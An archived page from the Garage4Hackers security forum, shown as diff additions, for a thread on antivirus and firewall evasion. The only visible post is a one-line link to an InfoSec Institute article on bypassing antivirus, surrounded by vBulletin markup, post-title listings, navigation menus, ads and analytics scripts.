+pd[7009] = '\r\n<li class="postbitlegacy postbitim postcontainer old" id="post_7009">\r\n<!-' + '- see bottom of postbit.css for .userinfo .popupmenu styles -' + '->\r\n\r\n	<div class="posthead">\r\n			<span class="postdate old">\r\n				\r\n					<span class="date">01-26-2012,&nbsp;<span class="time">02:55 PM</span></span>\r\n				\r\n			</span>\r\n			<span class="nodecontrols">\r\n				\r\n					<a name="post7009" href="showthread.php?t=708&amp;p=7009&amp;viewfull=1#post7009" class="postcounter">#20</a><a id="postcount7009" name="20"></a>\r\n				\r\n				\r\n				\r\n			</span>\r\n	</div>\r\n	<div class="postdetails">\r\n		<div class="userinfo">\r\n			<div class="username_container">\r\n			\r\n				<div class="popupmenu memberaction">\r\n	<a class="username offline popupctrl" href="member.php?u=191" title="abhaythehero is offline"><strong>abhaythehero</strong></a>\r\n	<ul class="popupbody popuphover memberaction_body">\r\n		<li class="left">\r\n			<a href="member.php?u=191" class="siteicon_profile">\r\n				View Profile\r\n			</a>\r\n		</li>\r\n		\r\n		<li class="right">\r\n			<a href="search.php?do=finduser&amp;userid=191&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">\r\n				View Forum Posts\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="private.php?do=newpm&amp;u=191" class="siteicon_message" rel="nofollow">\r\n				Private Message\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="blog.php?u=191" class="siteicon_blog" rel="nofollow">\r\n				View Blog Entries\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="https://twitter.com/#!/abhaythehero" class="siteicon_homepage">\r\n				Visit Homepage\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="http://garage4hackers.com/list.php?r=author/191-abhaythehero" class="siteicon_article" rel="nofollow">\r\n				View Articles\r\n			</a>\r\n		</li>\r\n		\r\n\r\n		\r\n\r\n		\r\n		\r\n	</ul>\r\n</div>\r\n				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.png" alt="abhaythehero is offline" border="0" />\r\n\r\n			\r\n			</div>\r\n			<span class="usertitle">\r\n				Super Commando Dhruv\r\n			</span>\r\n			\r\n			\r\n			\r\n				<span class="postbit_reputation" id="repdisplay_7009_191" title="abhaythehero has a spectacular aura about">\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n				</span>\r\n			\r\n			\r\n			<a class="postuseravatar" href="member.php?u=191" title="abhaythehero is offline">\r\n				<img src="image.php?u=191&amp;dateline=1330713871" alt="abhaythehero\'s Avatar" title="abhaythehero\'s Avatar" />\r\n			</a>\r\n			 \r\n			\r\n				<hr />\r\n				<dl class="userinfo_extra">\r\n					<dt>Join Date</dt> <dd>Sep 2010</dd>\r\n					<dt>Location</dt> <dd>Lucknow/Pune,India</dd>\r\n					\r\n					<dt>Posts</dt> <dd>466</dd>	\r\n					<dt>Blog Entries</dt><dd><a href="blog.php?u=191">2</a></dd>\r\n				</dl>\r\n				\r\n				\r\n				<div class="imlinks">\r\n					    \r\n				</div>\r\n			\r\n		</div>\r\n		<div class="postbody">\r\n			<div class="postrow has_after_content">\r\n				\r\n				\r\n\r\n\r\n						\r\n						\r\n				<div class="content">\r\n					<div id="post_message_7009">\r\n						<blockquote class="postcontent restore ">\r\n							How to bypass an antivirus a few (simple) examples by &gt;&gt;<br />\n <a href="http://resources.infosecinstitute.com/how-to-bypass-an-antivirus/" target="_blank">*InfoSec Institute &#8211; IT Training and Information Security Resources &#8211; How to Bypass an Antivirus</a>\r\n						</blockquote>\r\n					</div>\r\n\r\n					\r\n				</div>\r\n			</div>\r\n			\r\n			<div class="after_content">\r\n				\r\n				\r\n				\r\n				\r\n					<blockquote class="signature restore"><div class="signaturecontainer"><b><i>In the world of 0s and 1s, are you a zero or The One !</i></b></div></blockquote>\r\n				\r\n				\r\n			</div>\r\n			\r\n			<div class="cleardiv"></div>\r\n		</div>\r\n	</div>\r\n		<div class="postfoot">\r\n			<!-' + '- <div class="postfoot_container"> -' + '->\r\n			<div class="textcontrols floatcontainer">\r\n				<span class="postcontrols">\r\n					<img style="display:none" id="progress_7009" src="images/misc/progress.gif" alt="" />\r\n					\r\n					\r\n					\r\n						<a id="qrwq_7009" class="newreply" href="newreply.php?do=newreply&amp;p=7009" rel="nofollow" title="Reply With Quote"><img id="quoteimg_7009" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> \r\n					\r\n					\r\n					\r\n				</span>\r\n				<span class="postlinking">\r\n					\r\n						\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n\r\n					\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n					\r\n				</span>\r\n			<!-' + '- </div> -' + '->\r\n			</div>\r\n		</div>\r\n	<hr />\r\n</li>\r\n';
+
+// next/previous post info
+pn[2681] = "7009,2682";
+pn[0] = ",2681";
+pn[2682] = "2681,2683";
+pn[2683] = "2682,2686";
+pn[2686] = "2683,2688";
+pn[2688] = "2686,2690";
+pn[2690] = "2688,2695";
+pn[2695] = "2690,2694";
+pn[2694] = "2695,2698";
+pn[2698] = "2694,2701";
+pn[2701] = "2698,2723";
+pn[2723] = "2701,2702";
+pn[2702] = "2723,2703";
+pn[2703] = "2702,2704";
+pn[2704] = "2703,2706";
+pn[2706] = "2704,2709";
+pn[2709] = "2706,2711";
+pn[2711] = "2709,2713";
+pn[2713] = "2711,2735";
+pn[2735] = "2713,7009";
+pn[7009] = "2735,2681";
+
+// cached usernames
+pu[0] = guestphrase;
+pu[8] = "fb1h2s";
+pu[18] = "prashant_uniyal";
+pu[2] = "b0nd";
+pu[1] = "Punter";
+pu[17] = "DouBle_Zer0";
+pu[132] = "zerocool";
+pu[191] = "abhaythehero";
+
+// -->
+</script>
+
+
+<div id="threaded_view">
+	<h4>Threaded View</h4>
+
+	<div id="posttree">
+		<script type="text/javascript">
+		<!--
+			writeLink(2681, 0, 0, 8, "", "Antivirus/ Firewall Evasion...", "01-18-2011", "02:27 AM", 0, "showthreadea55.html?t=708&amp;p=2681#post2681");
+  writeLink(2682, 0, 0, 8, "T", "<i>Well PT was over but few...</i>", "01-18-2011", "02:29 AM", 0, "showthread88cc.html?t=708&amp;p=2682#post2682");
+  writeLink(2683, 0, 0, 8, "T", "<i>Heuristics: Considering shell...</i>", "01-18-2011", "02:30 AM", 0, "showthreada006-2.html?t=708&amp;p=2683#post2683");
+    writeLink(2686, 0, 0, 18, "I,L", "<i>Mind blowing fb1....!!! Keep...</i>", "01-18-2011", "10:05 AM", 0, "showthread0267.html?t=708&amp;p=2686#post2686");
+  writeLink(2688, 0, 0, 2, "T", "<i>Nice observation and...</i>", "01-18-2011", "03:27 PM", 0, "showthread9b55-2.html?t=708&amp;p=2688#post2688");
+  writeLink(2690, 0, 0, 1, "T", "<i>great dude this what we say...</i>", "01-18-2011", "03:49 PM", 0, "showthread21e3.html?t=708&amp;p=2690#post2690");
+    writeLink(2695, 0, 0, 17, "I,L", "Hash Generator for above...", "01-18-2011", "09:05 PM", 0, "showthread42b0.html?t=708&amp;p=2695#post2695");
+  writeLink(2694, 0, 0, 17, "T", "<i>well buddy Anti viruses are...</i>", "01-18-2011", "08:55 PM", 0, "showthread549c.html?t=708&amp;p=2694#post2694");
+  writeLink(2698, 0, 0, 8, "T", "<i>Well totally disagree , below...</i>", "01-19-2011", "12:12 AM", 0, "showthread3d95.html?t=708&amp;p=2698#post2698");
+  writeLink(2701, 0, 0, 17, "T", "<i>Oh.. OMG i don't know what is...</i>", "01-19-2011", "02:23 AM", 0, "showthreadc16d.html?t=708&amp;p=2701#post2701");
+    writeLink(2723, 0, 0, 132, "I,L", "<i>Gudd JObb...</i>", "01-20-2011", "04:11 PM", 0, "showthread910f.html?t=708&amp;p=2723#post2723");
+  writeLink(2702, 0, 0, 2, "T", "<i>Aaha! something good is going...</i>", "01-19-2011", "08:09 AM", 0, "showthread637b.html?t=708&amp;p=2702#post2702");
+  writeLink(2703, 0, 0, 8, "T", "<i>In heuristics detection I...</i>", "01-19-2011", "01:04 PM", 0, "showthread5f1c-2.html?t=708&amp;p=2703#post2703");
+    writeLink(2704, 0, 0, 8, "I,L", "<i>@Bond :) agreed , and + the...</i>", "01-19-2011", "01:07 PM", 0, "showthreadc684.html?t=708&amp;p=2704#post2704");
+  writeLink(2706, 0, 0, 17, "T", "<i>@bond: aaha.. now things...</i>", "01-19-2011", "05:30 PM", 0, "showthreadee2c-2.html?t=708&amp;p=2706#post2706");
+  writeLink(2709, 0, 0, 8, "T", "<i>Well my scenario was properly...</i>", "01-19-2011", "08:36 PM", 0, "showthread6543-2.html?t=708&amp;p=2709#post2709");
+  writeLink(2711, 0, 0, 18, "T", "<i>Well I am still learning...</i>", "01-19-2011", "10:40 PM", 0, "showthreaddbac.html?t=708&amp;p=2711#post2711");
+  writeLink(2713, 0, 0, 17, "T", "<i>&quot;Every Real Hacker Know What...</i>", "01-19-2011", "11:34 PM", 0, "showthreadc4fc.html?t=708&amp;p=2713#post2713");
+  writeLink(2735, 0, 0, 2, "T", "<i>Thanks to DouBle_Zer0 for...</i>", "01-21-2011", "07:25 AM", 0, "showthread6286-2.html?t=708&amp;p=2735#post2735");
+  writeLink(7009, 0, 0, 191, "L", "<i>How to bypass an antivirus a...</i>", "01-26-2012", "02:55 PM", 0, "showthread3f02.html?t=708&amp;p=7009#post7009");
+
+		//-->
+		</script>
+	</div>
+</div>
+	
+
+	
+		<ol id="posts" class="posts" start="1">
+			
+<li class="postbitlegacy postbitim postcontainer old" id="post_7009">
+<!-- see bottom of postbit.css for .userinfo .popupmenu styles -->
+
+	<div class="posthead">
+			<span class="postdate old">
+				
+					<span class="date">01-26-2012,&nbsp;<span class="time">02:55 PM</span></span>
+				
+			</span>
+			<span class="nodecontrols">
+				
+					<a name="post7009" href="showthreadc6be.html?t=708&amp;p=7009&amp;viewfull=1#post7009" class="postcounter">#20</a><a id="postcount7009" name="20"></a>
+				
+				
+				
+			</span>
+	</div>
+	<div class="postdetails">
+		<div class="userinfo">
+			<div class="username_container">
+			
+				<div class="popupmenu memberaction">
+	<a class="username offline popupctrl" href="membere62c.html?u=191" title="abhaythehero is offline"><strong>abhaythehero</strong></a>
+	<ul class="popupbody popuphover memberaction_body">
+		<li class="left">
+			<a href="membere62c.html?u=191" class="siteicon_profile">
+				View Profile
+			</a>
+		</li>
+		
+		<li class="right">
+			<a href="search4fd3.html?do=finduser&amp;userid=191&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">
+				View Forum Posts
+			</a>
+		</li>
+		
+		
+		<li class="left">
+			<a href="private7748.html?do=newpm&amp;u=191" class="siteicon_message" rel="nofollow">
+				Private Message
+			</a>
+		</li>
+		
+		
+		
+		<li class="right">
+			<a href="bloge62c.html?u=191" class="siteicon_blog" rel="nofollow">
+				View Blog Entries
+			</a>
+		</li>
+		
+		
+		
+		<li class="left">
+			<a href="../external.html?link=https://twitter.com/#!/abhaythehero" class="siteicon_homepage">
+				Visit Homepage
+			</a>
+		</li>
+		
+		
+		
+		<li class="right">
+			<a href="lista009.html?r=author/191-abhaythehero" class="siteicon_article" rel="nofollow">
+				View Articles
+			</a>
+		</li>
+		
+
+		
+
+		
+		
+	</ul>
+</div>
+				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.html" alt="abhaythehero is offline" border="0" />
+
+			
+			</div>
+			<span class="usertitle">
+				Super Commando Dhruv
+			</span>
+			
+			
+			
+				<span class="postbit_reputation" id="repdisplay_7009_191" title="abhaythehero has a spectacular aura about">
+					
+						<img class="repimg" src="images/reputation/reputation_pos.html" alt="" />
+					
+						<img class="repimg" src="images/reputation/reputation_pos.html" alt="" />
+					
+						<img class="repimg" src="images/reputation/reputation_pos.html" alt="" />
+					
+				</span>
+			
+			
+			<a class="postuseravatar" href="membere62c.html?u=191" title="abhaythehero is offline">
+				<img src="1fe76.jpg?u=191&amp;dateline=1330713871" alt="abhaythehero's Avatar" title="abhaythehero's Avatar" />
+			</a>
+			 
+			
+				<hr />
+				<dl class="userinfo_extra">
+					<dt>Join Date</dt> <dd>Sep 2010</dd>
+					<dt>Location</dt> <dd>Lucknow/Pune,India</dd>
+					
+					<dt>Posts</dt> <dd>466</dd>	
+					<dt>Blog Entries</dt><dd><a href="bloge62c.html?u=191">2</a></dd>
+				</dl>
+				
+				
+				<div class="imlinks">
+					    
+				</div>
+			
+		</div>
+		<div class="postbody">
+			<div class="postrow has_after_content">
+				
+				
+
+
+						
+						
+				<div class="content">
+					<div id="post_message_7009">
+						<blockquote class="postcontent restore ">
+							How to bypass an antivirus a few (simple) examples by &gt;&gt;<br />
+ <a href="../external.html?link=http://resources.infosecinstitute.com/how-to-bypass-an-antivirus/" target="_blank">*InfoSec Institute &#8211; IT Training and Information Security Resources &#8211; How to Bypass an Antivirus</a>
+						</blockquote>
+					</div>
+
+					
+				</div>
+			</div>
+			
+			<div class="after_content">
+				
+				
+				
+				
+					<blockquote class="signature restore"><div class="signaturecontainer"><b><i>In the world of 0s and 1s, are you a zero or The One !</i></b></div></blockquote>
+				
+				
+			</div>
+			
+			<div class="cleardiv"></div>
+		</div>
+	</div>
+		<div class="postfoot">
+			<!-- <div class="postfoot_container"> -->
+			<div class="textcontrols floatcontainer">
+				<span class="postcontrols">
+					<img style="display:none" id="progress_7009" src="images/misc/progress.html" alt="" />
+					
+					
+					
+						<a id="qrwq_7009" class="newreply" href="newreply81bd.html?do=newreply&amp;p=7009" rel="nofollow" title="Reply With Quote"><img id="quoteimg_7009" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> 
+					
+					
+					
+				</span>
+				<span class="postlinking">
+					
+						
+					
+
+					
+					
+					
+					
+
+					
+					
+
+					
+					
+					
+					
+					
+				</span>
+			<!-- </div> -->
+			</div>
+		</div>
+	<hr />
+</li>
+
+		</ol>
+                <div class="separator"></div>
+		<div class="postlistfoot">
+			
+		</div>
+
+	
+
+</div>
+
+<div id="below_postlist" class="noinlinemod below_postlist">
+	
+	<div id="pagination_bottom" class="pagination_bottom">
+	
+		<div class="clear"></div>
+<div class="navpopupmenu popupmenu nohovermenu" id="showthread_navpopup">
+	
+		<span class="shade">Quick Navigation</span>
+		<a href="showthread5d44.html?t=708" class="popupctrl"><span class="ctrlcontainer">Exploitation Techniques</span></a>
+		<a href="showthread3f02.html?t=708&amp;p=7009#top" class="textcontrol" onclick="document.location.hash='top';return false;">Top</a>
+	
+	<ul class="navpopupbody popupbody popuphover">
+		
+		<li class="optionlabel">Site Areas</li>
+		<li><a href="usercp.html">Settings</a></li>
+		<li><a href="private.html">Private Messages</a></li>
+		<li><a href="subscription.html">Subscriptions</a></li>
+		<li><a href="online.html">Who's Online</a></li>
+		<li><a href="search.html">Search Forums</a></li>
+		<li><a href="forum.html">Forums Home</a></li>
+		
+			<li class="optionlabel">Forums</li>
+			
+		
+			
+				<li><a href="forumdisplay58da.html?f=1">Garage Network</a>
+					<ol class="d1">
+						
+		
+			
+				<li><a href="forumdisplay12a3.html?f=2">Garage Announcements</a>
+					<ol class="d2">
+						
+		
+			
+				<li><a href="forumdisplaye57d.html?f=58">Bravo - Null 2012</a></li>
+			
+		
+			
+				<li><a href="forumdisplay0756.html?f=59">Garage Local Chapter Meets</a></li>
+			
+		
+			
+					</ol>
+				</li>
+			
+		
+			
+				<li><a href="forumdisplay31e6.html?f=4">Garage Rules</a></li>
+			
+		
+			
+				<li><a href="forumdisplaye774.html?f=5">Feedback &amp; Suggestions</a></li>
+			
+		
+			
+				<li><a href="forumdisplayd42b.html?f=7">Introduce Your Self</a></li>
+			
+		
+			
+				<li><a href="forumdisplay2b89.html?f=38">Shout-box</a></li>
+			
+		
+			
+					</ol>
+				</li>
+			
+		
+			
+				<li><a href="forumdisplaycf19.html?f=6">Garage Lounge</a>
+					<ol class="d1">
+						
+		
+			
+				<li><a href="forumdisplay5579.html?f=30">Hacking for Beginners</a>
+					<ol class="d2">
+						
+		
+			
+				<li><a href="forumdisplay6ac3.html?f=57">Did You Know?</a></li>
+			
+		
+			
+					</ol>
+				</li>
+			
+		
+			
+				<li><a href="forumdisplay957d.html?f=8">Security &amp; Hacking News Thread</a></li>
+			
+		
+			
+				<li><a href="forumdisplay3215.html?f=36">Career in InfoSec</a></li>
+			
+		
+			
+				<li><a href="forumdisplay814c.html?f=29">Request Zone</a></li>
+			
+		
+			
+				<li><a href="forumdisplay13b6.html?f=27">Noobs Corner</a></li>
+			
+		
+			
+					</ol>
+				</li>
+			
+		
+			
+				<li><a href="forumdisplayfdc5.html?f=9">Hacking and Security Discussions</a>
+					<ol class="d1">
+						
+		
+			
+				<li><a href="forumdisplayfac0.html?f=55">Tip | Trick of the Day</a></li>
+			
+		
+			
+				<li><a href="forumdisplayc4a6.html?f=66">ICS / SCADA Security</a></li>
+			
+		
+			
+				<li><a href="forumdisplay6111.html?f=67">Internet of Things - IoT</a></li>
+			
+		
+			
+				<li><a href="forumdisplay15ca.html?f=10">Network Vulnerabiltity Assessment &amp; Penetration Testing</a>
+					<ol class="d2">
+						
+		
+			
+				<li><a href="forumdisplaya05c.html?f=56">Post Exploitation</a></li>
+			
+		
+			
+					</ol>
+				</li>
+			
+		
+			
+				<li><a href="forumdisplay8a83.html?f=11">Web Application Penetration Testing</a></li>
+			
+		
+			
+				<li><a href="forumdisplay01c9.html?f=12">Wireless and Bluetooth Hacking</a></li>
+			
+		
+			
+				<li><a href="forumdisplay48ab.html?f=17">Computer Forensics and Incident Handling</a></li>
+			
+		
+			
+				<li><a href="forumdisplay218b.html?f=19">Physical Security and Social Engineering</a></li>
+			
+		
+			
+				<li><a href="forumdisplayb09f.html?f=15">General Security &amp; Best Practices</a></li>
+			
+		
+			
+				<li><a href="forumdisplay907f.html?f=42">Security and Hacking Videos</a></li>
+			
+		
+			
+				<li><a href="forumdisplay9e0d.html?f=54">Mobile Security</a></li>
+			
+		
+			
+					</ol>
+				</li>
+			
+		
+			
+				<li><a href="forumdisplay9780.html?f=14">General Security Discussions</a>
+					<ol class="d1">
+						
+		
+			
+				<li><a href="forumdisplay9df8.html?f=31">Programming</a>
+					<ol class="d2">
+						
+		
+			
+				<li><a href="forumdisplay65b9.html?f=35">Assembly</a></li>
+			
+		
+			
+				<li><a href="forumdisplayc4f1.html?f=32">C/C++</a></li>
+			
+		
+			
+				<li><a href="forumdisplayb0a0.html?f=34">Perl</a></li>
+			
+		
+			
+				<li><a href="forumdisplayb8c1.html?f=60">PHP</a></li>
+			
+		
+			
+				<li><a href="forumdisplay6c4e.html?f=33">Python</a></li>
+			
+		
+			
+				<li><a href="forumdisplay208f.html?f=51">Linux Shell / Bash Programming</a></li>
+			
+		
+			
+				<li><a href="forumdisplay3238.html?f=47">Windows Batch Programming</a></li>
+			
+		
+			
+					</ol>
+				</li>
+			
+		
+			
+				<li><a href="forumdisplayce40.html?f=28">BackTrack and Other Linux Distributions</a></li>
+			
+		
+			
+				<li><a href="forumdisplayf2fa.html?f=16">Networks &amp; Networking</a></li>
+			
+		
+			
+				<li><a href="forumdisplaya213.html?f=18">Cloud Computing</a></li>
+			
+		
+			
+				<li><a href="forumdisplaydfa4.html?f=39">Security Podcast and Videos</a></li>
+			
+		
+			
+				<li><a href="forumdisplaya3f5.html?f=40">Miscellanous Thread</a>
+					<ol class="d2">
+						
+		
+			
+				<li><a href="forumdisplay30ac.html?f=49">Brush Up Your Skills</a></li>
+			
+		
+			
+					</ol>
+				</li>
+			
+		
+			
+					</ol>
+				</li>
+			
+		
+			
+				<li><a href="forumdisplayffeb.html?f=20">Experts Forum</a>
+					<ol class="d1">
+						
+		
+			
+				<li><a href="forumdisplaycdba.html?f=48">My Meanest Hacks</a></li>
+			
+		
+			
+				<li><a href="forumdisplayf6ac.html?f=37">Hacking &amp; Security Books and Tutorials</a></li>
+			
+		
+			
+				<li><a href="forumdisplay8011.html?f=23">Tools &amp; Scripts</a></li>
+			
+		
+			
+				<li><a href="forumdisplay8941.html?f=22">Exploitation Techniques</a></li>
+			
+		
+			
+				<li><a href="forumdisplay345c.html?f=24">Reverse Engineering and Application Cracking</a></li>
+			
+		
+			
+				<li><a href="forumdisplaye8b3.html?f=25">Botnets, Malwares &amp; Rootkits Analysis</a></li>
+			
+		
+			
+				<li><a href="forumdisplay107e.html?f=43">Garage4hackers Exploits</a></li>
+			
+		
+			
+				<li><a href="forumdisplaye5f3.html?f=64">Browser Fuzzing</a></li>
+			
+		
+			
+					</ol>
+				</li>
+			
+		
+		
+	</ul>
+</div>
+<div class="clear"></div>
+	</div>
+</div>
+
+
+
+
+
+
+
+
+
+
+<!-- next / previous links -->
+<div class="navlinks">
+	
+	<strong>&laquo;</strong>
+	<a href="showthreadfff6.html?t=708&amp;goto=nextoldest" rel="nofollow">Previous Thread</a>
+	|
+	<a href="showthread6900.html?t=708&amp;goto=nextnewest" rel="nofollow">Next Thread</a>
+	<strong>&raquo;</strong>
+	
+</div>
+<!-- / next / previous links -->
+
+<div id="thread_info" class="thread_info">
+	
+	
+	
+	
+	<h4 class="threadinfohead"><span class="optiontitle">Tags for this Thread</span></h4>
+	<div id="thread_tags_list" class="thread_info_block">
+		<div class="inner_block">
+			
+			<div id='tag_list_cell'>
+				
+		
+			<a href="tags23c4.html?tag=antivirus+evasion">antivirus evasion</a>, 
+		
+			<a href="tags7970.html?tag=firewall+evasion">firewall evasion</a>
+		
+
+<img src="images/misc/11x11progress.html" id="tag_form_progress" class="inlineimg hidden" alt="" />
+			</div>
+			<p>
+				<a href="tags.html">View Tag Cloud</a>
+			</p>
+		</div>
+	</div>
+	
+	<div class="options_block_container">
+		
+		<div class="options_block">
+			<h4 class="collapse">
+				<a class="collapse" id="collapse_posting_rules" href="showthread3f02.html?t=708&amp;p=7009#top"><img src="images/buttons/collapse_40b.png" alt="" /></a>
+				<span class="optiontitle">Posting Permissions</span>
+			</h4>
+			<div id="posting_rules" class="thread_info_block">
+				
+<div id="forumrules" class="info_subblock">
+
+	<ul class="youcandoblock">
+		<li>You <strong>may not</strong> post new threads</li>
+		<li>You <strong>may not</strong> post replies</li>
+		<li>You <strong>may not</strong> post attachments</li>
+		<li>You <strong>may not</strong> edit your posts</li>
+		<li>&nbsp;</li>
+	</ul>
+	<div class="bbcodeblock">
+		<ul>
+			<li><a href="miscaff0.html?do=bbcode" target="_blank">BB code</a> is <strong>On</strong></li>
+			<li><a href="misc9712.html?do=showsmilies" target="_blank">Smilies</a> are <strong>On</strong></li>
+			<li><a href="miscaff0.html?do=bbcode#imgcode" target="_blank">[IMG]</a> code is <strong>On</strong></li>
+			<li><a href="miscaff0.html?do=bbcode#videocode" target="_blank">[VIDEO]</a> code is <strong>On</strong></li>
+			<li>HTML code is <strong>Off</strong></li>
+		</ul>
+	</div>
+	<p class="rules_link"><a href="misc17ec.html?do=showrules" target="_blank">Forum Rules</a></p>
+
+</div>
+
+			</div>
+		</div>
+
+	</div>
+
+</div>
+
+
+
+
+
+
+
+
+<div style="clear: left">
+  
+<div class="google_adsense_footer" style="width:468px; margin:0 auto; padding-top:1em">
+<script type="text/javascript"><!--
+google_ad_client = "ca-pub-6847984837250662";
+google_ad_host = "ca-host-pub-2606800903002383";
+google_ad_width = 468;
+google_ad_height = 60;
+google_ad_format = "468x60_as";
+google_ad_type = "text_image";
+google_ad_channel = "";
+google_color_border = "";
+google_color_bg = "";
+google_color_link = "";
+google_color_text = "";
+google_color_url = "";
+google_ui_features = "rc:6";
+//-->
+</script>
+<script type="text/javascript"
+  src="../pagead2.googlesyndication.com/pagead/show_ads.js">
+</script>
+</div>
+
+  <div id="ad_global_above_footer"><div align="center">
+<script type="text/javascript"><!--
+google_ad_client = "pub-6847984837250662";
+/* 728x90, created 7/9/10 */
+google_ad_slot = "7101394260";
+google_ad_width = 728;
+google_ad_height = 90;
+//-->
+</script>
+<script type="text/javascript"
+src="../pagead2.googlesyndication.com/pagead/show_ads.js">
+</script></div>
+</div>
+
+<div id="footer" class="floatcontainer footer">
+
+	<form action="../external.html?link=http://garage4hackers.com/forum.php" method="get" id="footer_select" class="footer_select">
+
+		
+			<select name="styleid" onchange="switch_id(this, 'style')">
+				<optgroup label="Quick Style Chooser"><option class="hidden"></option></optgroup>
+				
+					
+					<optgroup label="&nbsp;Standard Styles">
+									
+					
+	<option value="1" class="" selected="selected">-- Default Style</option>
+
+					
+					</optgroup>
+										
+				
+				
+					
+					<optgroup label="&nbsp;Mobile Styles">
+					
+					
+	<option value="2" class="" >-- Default Mobile Style</option>
+
+					
+					</optgroup>
+										
+				
+			</select>	
+		
+		
+		
+	</form>
+
+	<ul id="footer_links" class="footer_links">
+		<li><a href="sendmessage.html" rel="nofollow" accesskey="9">Contact Us</a></li>
+		<li><a href="index.html">Garage4hackers</a></li>
+		
+		
+		<li><a href="archive/index.html">Archive</a></li>
+		<li><a href="../external.html?link=http://glowhost.com/" target="_blank">Web Hosting</a></li>
+		
+		
+		<li><a href="showthread3f02.html?t=708&amp;p=7009#top" onclick="document.location.hash='top'; return false;">Top</a></li>
+	</ul>
+	
+	
+	
+	
+	<script type="text/javascript">
+	<!--
+		// Main vBulletin Javascript Initialization
+		vBulletin_init();
+		function md5hash(B,A,E,C){if(navigator.userAgent.indexOf("Mozilla/index.html")==1&&parseInt(navigator.appVersion)>=4){var D=hex_md5(str_to_ent(trim(B.value)));A.value=D;if(E){D=hex_md5(trim(B.value));E.value=D}if(!C){B.value=""}}return true};
+	//-->
+	</script>
+        
+</div>
+</div> <!-- closing div for body_wrapper -->
+
+<div class="below_body">
+<div id="footer_time" class="shade footer_time">All times are GMT +5.5. The time now is <span class="time">05:49 PM</span>.</div>
+
+<div id="footer_copyright" class="shade footer_copyright">
+	<!-- Do not remove this copyright notice -->
+	Powered by <a href="../external.html?link=https://www.vbulletin.com/" id="vbulletinlink">vBulletin&reg;</a> Version 4.2.1 <br />Copyright &copy; 2020 vBulletin Solutions, Inc. All rights reserved. 
+	<!-- Do not remove this copyright notice -->	
+</div>
+<div id="footer_morecopyright" class="shade footer_morecopyright">
+	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
+	
+	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
+	Copyright 2010 - 2017, Garage4Hackers
+	
+</div>
+ 
+
+	<div id="fb-root"></div>
+<script type="text/javascript" src="clientscript/vbulletin_facebook6719.js?v=421"></script>
+
+<script type="text/javascript">
+<!--
+	loadFacebookAPI('en_US');
+	function fbAsyncInit()
+	{
+		vBfb = new vB_Facebook({
+			appid : "170793809601191",
+			connected : 0,
+			active : 0,
+			autoreg : 0,
+			feed_newthread : 1,
+			feed_postreply : 1,
+			feed_blogentry : 1,
+			feed_blogcomment : 1,
+			feed_newarticle : 1,
+			feed_articlecomment : 1
+		});
+	}
+// -->
+</script>
+
+</div>
+<script type="text/javascript">
+var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+</script>
+<script type="text/javascript">
+try{
+var pageTracker = _gat._getTracker('UA-17311051-3');
+pageTracker._trackPageview();
+} catch(err) {}</script>
+</body>
+</html>
